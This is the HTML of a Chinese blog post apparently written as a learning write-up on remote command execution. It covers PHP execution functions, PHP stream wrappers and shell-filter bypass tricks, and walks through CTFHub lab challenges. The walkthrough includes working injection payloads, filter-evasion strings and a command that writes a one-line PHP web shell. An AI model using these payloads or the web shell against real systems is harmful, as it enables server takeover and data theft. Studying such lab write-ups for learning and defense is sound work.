@@ -1,0 +1,552 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN ">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hoylindo || 基础漏洞之——RCE</title>
+    <meta name="author" content="hoylindo">
+    <meta name="description" content="嗨，这里是一个搭建的不太熟练的小破站 ">
+    <meta name="keywords" content=" ">
+    <link rel="icon" href="/1.jpg">
+    <link rel="stylesheet" href="/css/antd.min.css">
+    
+    <link rel="stylesheet" href="/css/maiden-theme.css">
+    
+    <script src="/js/vue.js"></script>
+    <script src="/js/antd.min.js"></script>
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body>
+
+    <div id="loading"
+        style="height: 100vh; width: 100%; position: fixed;display: flex;z-index: 200; justify-content: space-between;">
+        <div id="loadleft" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div id="loadright" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div
+            style="position: fixed; height: 100vh; width: 100%;display: flex;justify-content: center;align-items: center;">
+            <div id="loadcontent"
+                style="width:400px;height:400px;padding:50px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px#fba3cf; text-align:center;opacity:1;transition:opacity 0.3s ease-out;">
+                <div>
+                    <h2>LOADING...</h2>
+                    <p>哒哒哒哒哒~</p>
+                    <div>
+                        <img src="/dancingkitty.gif" alt="loading">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="layout">
+        <transition name="into">
+            <div v-show="show_page" style="display: none;">
+                <div id="menu_show">
+                     
+<nav id="menu">
+    <div class="desktop-menu">
+        <a href="/">
+            <span class="title">Hoylindo</span>
+        </a>
+        
+        <a href="/">
+            <span>
+                <a-icon type="home" theme="filled" />
+            </span>
+            <span>home</span>
+        </a>
+        
+        <a href="/about">
+            <span>
+                <a-icon type="idcard" theme="filled" />
+            </span>
+            <span>about</span>
+        </a>
+        
+        <a href="/archives">
+            <span>
+                <a-icon type="folder" theme="filled" />
+            </span>
+            <span>archives</span>
+        </a>
+        
+        <a href="/categories">
+            <span>
+                <a-icon type="book" theme="filled" />
+            </span>
+            <span>categories</span>
+        </a>
+        
+        <a href="/tags">
+            <span>
+                <a-icon type="tags" theme="filled" />
+            </span>
+            <span>tags</span>
+        </a>
+        
+    </div>
+
+    <div :class="'phone-menu ' + menu_show" id="phone-menu">
+        <div :class="'title'" @click="menu_show=!menu_show">
+            <span style="margin-right: 10px;">
+                <a-icon type="appstore" theme="filled" />
+            </span>
+            <span>Hoylindo</span>
+        </div>
+        <div class="items" v-show="menu_show">
+            
+            <a href="/">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="home" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">home</div>
+                </div>
+            </a>
+            
+            <a href="/about">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="idcard" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">about</div>
+                </div>
+            </a>
+            
+            <a href="/archives">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="folder" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">archives</div>
+                </div>
+            </a>
+            
+            <a href="/categories">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="book" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">categories</div>
+                </div>
+            </a>
+            
+            <a href="/tags">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="tags" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">tags</div>
+                </div>
+            </a>
+            
+        </div>
+        <div class="curtain" v-show="menu_show"></div>
+    </div>
+
+</nav>
+                </div>
+
+                <div id="main">
+                     
+<link rel="stylesheet" href="/css/post-body.css">
+<div class="article">
+    <div>
+        <h1>基础漏洞之——RCE </h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <a-icon type="calendar" theme="filled" />
+            </span>
+            2022/8/15
+        </span>
+
+        
+        <span class="category">
+            <a href="/categories/关于网络安全">
+                <span class="icon">
+                    <a-icon type="book" theme="filled" />
+                </span>
+                关于网络安全
+            </a>
+        </span>
+        
+
+        
+
+        <span class="tags">
+            <span class="icon">
+                <a-icon type="tags" theme="filled" />
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/RCE" style=color:#00bcd4>
+                    RCE
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+
+    <div class="content" v-pre>
+        <p>关于RCE的一些知识点和靶场的wp</p>
+<span id="more"></span>
+
+<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p><strong><a target="_blank" rel="noopener" href="https://websec.readthedocs.io/zh/latest/vuln/cmdinjection.html">大佬的文章!</a></strong></p>
+<h3 id="关于RCE"><a href="#关于RCE" class="headerlink" title="关于RCE"></a>关于RCE</h3><ul>
+<li><p>远程命令/代码执行漏洞，简称RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统</p>
+</li>
+<li><p>一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口、</p>
+</li>
+<li><p>系统命令执行函数：</p>
+<ul>
+<li><p><code>system()</code>——<code>system( string $command [, int &amp;$return_var ] )</code>：$command为执行的命令，&amp;return_var可选，用来存放命令执行后的状态码，函数执行有回显，将执行结果输出到页面上</p>
+</li>
+<li><p><code>passthru()</code>——和它楼上一样</p>
+</li>
+<li><p><code>exec()</code>——<code>exec( string $command [, array &amp;$output [, int &amp;$return_var ]] )</code>：$command是要执行的命令，$output是获得执行命令输出的每一行字符串，$return_var用来保存命令执行的状态码（检测成功或失败），exec()函数执行无回显，默认返回最后一行结果，可以用echo输出</p>
+</li>
+<li><p><code>shell_exec()</code>——<code>shell_exec( string &amp;command)</code>：&amp;command是要执行的命令，shell_exec()函数默认无回显，通过 echo 可将执行结果输出到页面，shell_exec() 函数实际上仅是反引号`` `操作符的变体，当禁用shell_exec时, 反引号也不可执行</p>
+<ul>
+<li>关于反引号：php中称之为执行运算符，PHP将反引号中的内容作为 shell 命令来执行，并将其输出信息返回</li>
+</ul>
+</li>
+<li><p><code>popen()</code>—— <code>popen ( string $command , string $mode )</code>：函数需要两个参数，一个是执行的命令command，另外一个是指针文件的连接模式mode，有r和w代表读和写，函数不会直接返回执行结果，而是返回一个文件指针，但是命令已经执行，popen()打开一个指向进程的管道，该进程由派生给定的command命令执行而产生，此指针可以用于fgets()，fgetss()和 fwrite()——就当成C语言的文件指针理解吧</p>
+<p>还是放代码好理解一点</p>
+<pre><code class="php">&lt;?php  
+$test = &quot;ls /tmp/test&quot;;
+$fp = popen($test,&quot;r&quot;);  //popen打一个进程通道 
+while (!feof($fp)) &#123; 
+$out = fgets($fp, 4096);  //从通道里面取得东西  
+echo  $out;  //打印出来  
+&#125;
+pclose($fp); 
+?&gt;
+</code></pre>
+</li>
+<li><p><code>proc_open()</code>——<code>proc_open (string $cmd ,array $descriptorspec ,array &amp;$pipes [, string $cwd [, array $env [, array $other_options ]]])</code>：与Popen函数类似，但是可以提供双向管道</p>
+<p>来看代码</p>
+<pre><code>&lt;?php  
+$test = &quot;ipconfig&quot;;
+$array =  array(array(&quot;pipe&quot;,&quot;r&quot;),   //标准输入  
+array(&quot;pipe&quot;,&quot;w&quot;),   //标准输出内容  
+array(&quot;pipe&quot;,&quot;w&quot;)    //标准输出错误  
+);
+$fp = proc_open($test,$array,$pipes);   //打开一个进程通道  
+echo stream_get_contents($pipes[1]);    //为什么是$pipes[1]，因为1是输出内容  proc_close($fp);
+?&gt;
+</code></pre>
+</li>
+<li><p>**<code>pcntl_exec()</code>**——<code>pcntl_exec ( string $path [, array $args [, array $envs ]] )</code>：path是可执行二进制文件路径或一个在文件第一行指定了 一个可执行文件路径标头的脚本，args是一个要传递给程序的参数的字符串数组</p>
+<ul>
+<li>pcntl是linux下的一个扩展，需要额外安装，可以支持 php 的多线程操作</li>
+<li>pcntl_exec函数的作用是在当前进程空间执行指定程序，版本要求：PHP &gt; 4.2.0</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="关于PHP伪协议"><a href="#关于PHP伪协议" class="headerlink" title="关于PHP伪协议"></a>关于PHP伪协议</h3><p><strong><a target="_blank" rel="noopener" href="https://www.cnblogs.com/linfangnan/p/13535097.html">大佬的文章</a></strong></p>
+<p>PHP 伪协议是 PHP 支持的协议与封装协议，几个 PHP 支持的伪协议如下：</p>
+<table>
+<thead>
+<tr>
+<th>伪协议</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>file://</td>
+<td>访问本地文件系统</td>
+</tr>
+<tr>
+<td>http://</td>
+<td>访问 HTTP(s) 网址</td>
+</tr>
+<tr>
+<td>php://</td>
+<td>访问各个输入/输出流</td>
+</tr>
+<tr>
+<td>phar://</td>
+<td>PHP 归档</td>
+</tr>
+<tr>
+<td>zip://</td>
+<td>压缩流</td>
+</tr>
+</tbody></table>
+<ul>
+<li><p><strong>file伪协议</strong></p>
+<ul>
+<li><code>php://input</code>用于访问问请求的原始数据的只读流，可以读取POST请求的参数</li>
+<li>例如在 allow_url_include = on 时服务器上有个文件叫 index.php，且存在文件包含漏洞，这个时候就能用 php 伪协议直接把文件显示出来</li>
+<li>?file=php://filter/read=convert.base64-encode/resource=index.php</li>
+<li><code>php://filter/</code> 是一种访问本地文件的协议，<code>/read=convert.base64-encode/</code>表示读取的方式是 base64 编码后（不编码php可能会直接执行），resource=index.php表示目标文件为index.php</li>
+</ul>
+</li>
+<li><p><strong>data伪协议</strong></p>
+<ul>
+<li><p>php 5.2.0 起，数据流封装器开始有效，主要用于数据流的读取，如果传入的数据是PHP代码就会执行代码。使用方法为:</p>
+</li>
+<li><p><code>data://text/plain;base64,xxxx</code>——xxxx指(base64编码后的数据)</p>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="关于命令连接符"><a href="#关于命令连接符" class="headerlink" title="关于命令连接符"></a>关于命令连接符</h3><ul>
+<li><strong>windows</strong><ul>
+<li><code>|</code>——前语句为真则执行后边的语句，前语句为假则直接报错后边不执行</li>
+<li><code>||</code>——如果前面的语句执行出错，则执行后面的语句，前语句为真仅执行前面的语句</li>
+<li><code>&amp;</code>——前后的语句均可执行，但是前面的语句如果执行结果为假（即执行失败），则仅输出后面语句的结果</li>
+<li><code>&amp;&amp;</code>——如果前面的语句为假，则直接报错，也不执行后面的语句，前语句为真则前后都执行</li>
+</ul>
+</li>
+<li><strong>linux</strong><ul>
+<li><code>;</code>——按顺序执行语句</li>
+<li><code>|</code>将前边的命令输出作为后边命令的输入，<strong>前后都会执行</strong>，但是只显示后边命令的执行结果</li>
+<li><code>||</code>如果前面的语句执行失败，则执行后面的语句，如果前面的语句执行成功，则不执行后面的语句</li>
+<li><code>&amp;</code>作用是使得命令在它后边运行，这样就可以同时执行多条命令</li>
+<li><code>&amp;&amp;</code>如果前边的命令执行成功，则执行后边的命令</li>
+</ul>
+</li>
+</ul>
+<h3 id="关于ping命令"><a href="#关于ping命令" class="headerlink" title="关于ping命令"></a>关于ping命令</h3><ul>
+<li><strong>ping</strong> (Packet Internet Groper)，因特网包探索器，用于测试网络连接量的程序，ping命令发送数据使用的是ICMP协议</li>
+<li>Ping发送一个ICMP，回声请求消息给目的地并报告是否收到所希望的ICMP echo（ICMP回声应答），它是用来<strong>检查网络是否通畅</strong>或者<strong>网络连接速度</strong>的命令 </li>
+<li>ping命令可以用来<strong>作为网络可用性的检查</strong>，ping命令可以对一个网络地址发送测试数据包，看该网络地址是否有响应并统计响应时间，以此测试网络连接及主机是否可达</li>
+<li><strong>ICMP协议</strong>是“Internet Control Message Protocol”（因特网控制消息协议）的缩写，它是TCP/IP协议族的一个子协议，用于IP主机、路由器之间传递控制消息</li>
+</ul>
+<h3 id="关于命令执行各种绕过"><a href="#关于命令执行各种绕过" class="headerlink" title="关于命令执行各种绕过"></a>关于命令执行各种绕过</h3><ul>
+<li><p><strong><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/391439312">大佬的文章</a></strong></p>
+</li>
+<li><p>cat被过滤时（其实还是靠对各种命令的熟悉）</p>
+<pre><code class="shell">more     #一页一页的显示档案内容
+less     #与 more 类似
+head     #查看头几行
+tac      #从最后一行开始显示，可以看出 tac 是 cat 的反向显示
+tail     #查看尾几行
+nl       #显示的时候，顺便输出行号
+od       #以二进制的方式读取档案内容
+sort     #可以查看
+uniq     #可以查看
+//vi       #一种编辑器，这个也可以查看
+//vim      #一种编辑器，这个也可以查看
+//file -f  #报错出具体内容
+//sh /flag 2&gt;%261  #报错出文件内容
+
+#使用转义符号
+ca\t /fl\ag
+cat fl&#39;&#39;ag
+
+#拼接法
+a=fl;b=ag;cat$IFS$a$b
+
+#使用空变量$*和$@，$x,$&#123;x&#125;绕过
+ca$*t flag || ca$@t flag || ca$5t flag ca$&#123;5&#125;t flag
+
+find    #列出当前目录下的文件以及子目录所有文件
+</code></pre>
+</li>
+<li><p>过滤空格</p>
+<pre><code class="shell">cat&lt;flag  #重定向符
+cat$&#123;IFS&#125;flag || cat$IFS$9flag #全局变量
+#$IFS在linux下表示分隔符，但是如果单纯的cat$IFS2,bash解释器会把整个IFS2当做变量名，所以导致输不出来结果
+#然而如果加一个&#123;&#125;就固定了变量名，同理在后面加个$可以起到截断的作用，
+#为什么要用$9呢，因为$9是当前系统shell进程的第九个参数的持有者，它始终为空字符串
+</code></pre>
+</li>
+<li><p>过滤目录分割符</p>
+<pre><code class="shell">#采用多管道命令绕过
+127.0.0.1||cd flag_is_here;cat flag_262431433226364.php
+
+%0a      #换行符
+%0d      #回车符号
+用?&gt;代替 ;
+#在php中可以用?&gt;来代替最后的一个; ，因为php遇到定界符关闭标签会自动在末尾加上一个分号
+</code></pre>
+</li>
+</ul>
+<h3 id="CTFHub——RCE"><a href="#CTFHub——RCE" class="headerlink" title="CTFHub——RCE"></a>CTFHub——RCE</h3><h4 id="eval执行"><a href="#eval执行" class="headerlink" title="eval执行"></a>eval执行</h4><blockquote>
+<ul>
+<li>eval老朋友了，最近遇到好多次，一个很常见的PHP函数，把字符串按照 PHP 代码来计算</li>
+<li>要求传入一个cmd参数并作为代码执行—— <code>?cmd=system(&quot;ls /&quot;);</code>||<code>?cmd=system(&quot;ls ../../../&quot;);</code></li>
+<li>用到了之前学的Linux命令——<code>ls</code>（列出目录及文件名）和<code>cat</code>（顺序打印文件）</li>
+<li>然后可以看到当前目录啥也没有，然后就回退回退回退，找到了一个名字带着flag的文件，然后cat</li>
+</ul>
+</blockquote>
+<h4 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h4><blockquote>
+<ul>
+<li>文件包含是指编译器进行预处理时复制指定的文件内容代替源文件中预处理命令的过程，一个源文件可以将另一个源文件的全部内容包含进来</li>
+<li>通俗一点：开发人员将用到的代码转换成一个文件，让每一个用到它的代码都包含在里面，而无需再次编写，这种调用文件的过程一般被称为包含文件，由于这种灵活性，从而导致客户端可以调用任意恶意文件，从而造成文件包含漏洞</li>
+</ul>
+<hr>
+<ol>
+<li>因为之前在文件上传里碰到过文件包含，所以我就用蚁剑连了一下</li>
+<li>然后在根目录找到了flag</li>
+</ol>
+<p>说说另一种做法</p>
+<ol>
+<li>根据给你看的源码，可以get方式传入一个file参数，加上提示了shell.txt，因此传参<code>?file=shell.txt</code></li>
+<li>然后点开shell.txt，能看到是个一句话木马，然后传参<code>?ctfhub=system(&quot;ls /&quot;);</code> 后边可以自己想象了</li>
+<li>然后就是那个命令后边的==<strong>引号</strong>==真的很重要啊！！！一开始忘记这事儿死活打印不出目录😭…发现上边的wp我甚至也没有打引号</li>
+</ol>
+</blockquote>
+<h5 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h5><blockquote>
+<ul>
+<li>php://input是php输入流，用于执行php代码</li>
+<li>日常后悔二阶段没好好学PHP</li>
+</ul>
+<hr>
+<ol>
+<li>get先传进去一个<code>?file=php://input</code></li>
+<li>bp抓包，前边传参方式改成POST（其实试了一下改不改都一样），加上一行 <code>&lt;?php system(&quot;cat /flag&quot;); ?&gt;</code></li>
+<li>…不知道为啥用hackbar不行</li>
+</ol>
+</blockquote>
+<h5 id="读取源代码"><a href="#读取源代码" class="headerlink" title="读取源代码"></a>读取源代码</h5><blockquote>
+<ol>
+<li>看到读取源码想到了我学了一点就丢下的SSRF，于是想到了php伪协议</li>
+<li>不出我所料就是这样，提示了flag is in /flag</li>
+<li>传参?<code>file=php://filter/read=convert.base64-encode/resource=/flag</code>，然后base64解码</li>
+</ol>
+</blockquote>
+<h5 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h5><blockquote>
+<ol>
+<li>跟它楼上的楼上一模一样</li>
+<li>找到一种大佬做法，感觉才理解什么是远程包含：大老鼠在file里传了一个url，然后是自己本地的代码，然后被执行得到flag</li>
+</ol>
+</blockquote>
+<h4 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h4><blockquote>
+<p>命令注入通常因为指Web应用在服务器上拼接系统命令而造成的漏洞，该类漏洞通常出现在调用外部程序完成一些功能的情景下，比如一些Web管理界面的配置主机名/IP/掩码/网关、查看系统信息以及关闭重启等功能，或者一些站点提供如ping、nslookup、提供发送邮件、转换图片等功能都可能出现该类漏洞</p>
+<hr>
+<ol>
+<li>一个ping的页面，然后说了什么都没有过滤，直接写入 <code>127.0.0.1||ls</code></li>
+<li>找到两个php文件，<code>127.0.0.1||cat index.php</code></li>
+<li>先看了一下index.php，啥也没有，然后看了一下1908068656230.php竟然没回显？？？？？？？？？/</li>
+<li>查看源码找到flag，或者跟上边一样用base64编码回显</li>
+</ol>
+<hr>
+<ol>
+<li>看到一种高级的做法，是写入了一句话木马然后用蚁剑连接</li>
+<li>写入<code>echo -e &quot;&lt;?php @eval(\$_POST[&#39;test&#39;]);?&gt;&quot; &gt; 123.php</code></li>
+<li>需要注意echo命令会调用$_POST导致原始文件中没有，因此需要加上<code>-e</code>并在<code>$_POST</code>前加<code>/</code></li>
+</ol>
+</blockquote>
+<h5 id="过滤cat"><a href="#过滤cat" class="headerlink" title="过滤cat"></a>过滤cat</h5><blockquote>
+<ol>
+<li>太实诚了，真就只过滤了cat，tac还能用</li>
+<li><code>127.0.0.1||ls</code> ——找到了flag_31451262553332.php</li>
+<li><code>127.0.0.1||tac flag_31451262553332.php</code> ——查看源码得到flag</li>
+<li>或者<code>127.0.0.1||tac|base64 flag_31451262553332.php</code>，解码得到flag</li>
+</ol>
+</blockquote>
+<h5 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h5><blockquote>
+<ol>
+<li><code>127.0.0.1||ls</code>找到了flag_14446108964382.php</li>
+<li><code>127.0.0.1||cat&lt;flag_14446108964382.php</code>，得到flag，其它绕过方式在上边</li>
+</ol>
+</blockquote>
+<h5 id="过滤目录分隔符"><a href="#过滤目录分隔符" class="headerlink" title="过滤目录分隔符"></a>过滤目录分隔符</h5><blockquote>
+<ol>
+<li><code>127.0.0.1||ls</code>找到了一个目录：flag_is_here，然后<code>127.0.0.1||ls flag_is_here</code>找到了flag_269762648515759.php</li>
+<li>因为过滤了目录分隔符，所以可以先cd到这个文件夹中，然后cat：<code>127.0.0.1|| cd flag_is_here;cat flag_269762648515759.php</code></li>
+</ol>
+</blockquote>
+<h5 id="过滤运算符"><a href="#过滤运算符" class="headerlink" title="过滤运算符"></a>过滤运算符</h5><blockquote>
+<ol>
+<li>过滤了<code>| &amp; / \</code>但是没有过滤 <code>;</code></li>
+<li><code>;ls</code>找到flag_2364320229302.php</li>
+<li><code>;cat flag_2364320229302.php</code>得到flag</li>
+</ol>
+</blockquote>
+<h5 id="综合过滤练习"><a href="#综合过滤练习" class="headerlink" title="综合过滤练习"></a>综合过滤练习</h5><blockquote>
+<ol>
+<li>过滤了这么多<code>/(\||&amp;|;| |\/|cat|flag|ctfhub)/</code>😭</li>
+<li>127.0.0.1%0als找到文件夹flag_is_here</li>
+<li>因为flag也被过滤了<code>127.0.0.1%0als$&#123;IFS&#125;fla$5g_is_here</code></li>
+<li><code>127.0.0.1%0acd$&#123;IFS&#125;fla$3g_is_here%0atac$&#123;IFS&#125;fla$9g_95741165210297.php</code>，查看源码得到flag</li>
+</ol>
+<hr>
+<ul>
+<li>这里需要注意的就是<code>%0a</code>，我在上边过滤空格还是什么的时候试了一下不能用</li>
+<li>现在找到原因是我在页面的输入框写入的，然后因为在url里会被编码所以用不了，直接在url里写就行了</li>
+<li>然后说到这个%0a和%0d，我说好熟悉的样子，看CLRF的时候看到了，但是没记住（甚至没记），果然学东西还是要细致一点</li>
+</ul>
+</blockquote>
+
+    </div>
+
+    
+</div>
+                     
+<footer id="footer">
+    <div class="footer-wrap">
+        <div>
+            © 2022 - 2022 Hoylindo
+            <span class="footer-icon">
+                <a-icon type="flag" theme="filled" /></span>
+            @hoylindo
+        </div>
+        <div></div>
+        <div>Based on the <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo Engine</a> & <a
+                target="_blank" rel="noopener" href="https://github.com/korilin/hexo-theme-particle">Particle Theme</a></div>
+        
+    </div>
+
+</footer>
+
+<script src="/js/highlight.min.js"></script>
+<script src="/js/particle.js"></script>
+                </div>
+            </div>
+        </transition>
+    </div>
+
+    <script>
+    new Vue({
+        el: "#layout",
+        data: {
+            show_page: false,
+            onload_menu: false,
+            menu_show: false,
+            card_top: 100
+        },
+        created: function () {
+            var that = this
+            window.onload = function () {
+                that.show_page = true
+                document.getElementById("loadcontent").style.opacity = 0
+                setTimeout(function () {
+                    document.getElementById("loadleft").style.width = 0
+                    document.getElementById("loadright").style.width = 0
+                }, 300)
+                setTimeout(function () {
+                    document.getElementById("loading").style = "display:none"
+                }, 600)
+            }
+        },
+        mounted: function () {
+            var that = this
+            window.addEventListener('scroll', function (e) {
+                that.menu_show = false
+            })
+        },
+        methods: {
+            home_click: function () {
+                window.scrollTo({
+                    top: window.innerHeight - 80,
+                    behavior: "smooth",
+                });
+            }
+        }
+    })
+</script>
+
+</body>
+
+</html>
